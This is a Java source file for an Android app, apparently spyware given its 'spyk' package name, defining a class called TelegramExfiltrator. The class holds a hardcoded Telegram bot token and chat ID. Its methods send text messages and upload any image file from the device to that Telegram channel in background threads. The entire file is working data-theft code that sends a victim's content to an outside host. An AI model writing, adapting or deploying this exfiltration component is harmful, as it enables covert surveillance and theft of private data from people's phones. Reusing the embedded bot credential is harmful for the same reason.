package com.ware.spyk;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

import android.util.Log;
public class TelegramExfiltrator {

    private static final String BOT_TOKEN = "7919835217:AAGZyqI1N7h4rlS_vevNGqvKxRZY6ZeRivo";
    private static final String CHAT_ID = "-1002606236199"; // ID du channel ou chat

    public static void sendTexte(String message) {
        message = message.replace("_", "\\_")
                .replace("*", "\\*")
                .replace("[", "\\[")
                .replace("]", "\\]")
                .replace("(", "\\(")
                .replace(")", "\\)")
                .replace("~", "\\~")
                .replace("`", "\\`")
                .replace(">", "\\>")
                .replace("#", "\\#")
                .replace("+", "\\+")
                .replace("-", "\\-")
                .replace("=", "\\=")
                .replace("|", "\\|")
                .replace("{", "\\{")
                .replace("}", "\\}")
                .replace(".", "\\.")
                .replace("!", "\\!")
                .replace("\n", "  \n");

        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"
                + "?chat_id=" + CHAT_ID
                + "&text=" + URLEncoder.encode(message)
                + "&parse_mode=MarkdownV2";
        new Thread(() -> {
            try {
                URL obj = new URL(url);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("GET");
                int responseCode = con.getResponseCode();
                Log.d("TelegramExfiltrator", "Response Code : " + responseCode);
            } catch (Exception e) {
                Log.e("TelegramExfiltrator", "Erreur lors de l'envoi du text", e);
                e.printStackTrace();
            }
        }).start();
    }

    public static void sendPhoto(String filePath) {

        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=---ContentBoundary");

                String bodyStart = "-----ContentBoundary\r\n" +
                        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                        CHAT_ID + "\r\n" +
                        "-----ContentBoundary\r\n" +
                        "Content-Disposition: form-data; name=\"photo\"; filename=\"image.jpg\"\r\n" +
                        "Content-Type: image/jpeg\r\n\r\n";

                String bodyEnd = "\r\n-----ContentBoundary--\r\n";

                OutputStream outputStream = conn.getOutputStream();
                outputStream.write(bodyStart.getBytes());

                // Lis et envoie l’image
                FileInputStream fileInputStream = new FileInputStream(new File(filePath));
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }
                fileInputStream.close();

                outputStream.write(bodyEnd.getBytes());
                outputStream.flush();
                outputStream.close();

                int responseCode = conn.getResponseCode();
                Log.d("TelegramExfiltrator", "Photo Response Code : " + responseCode);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}

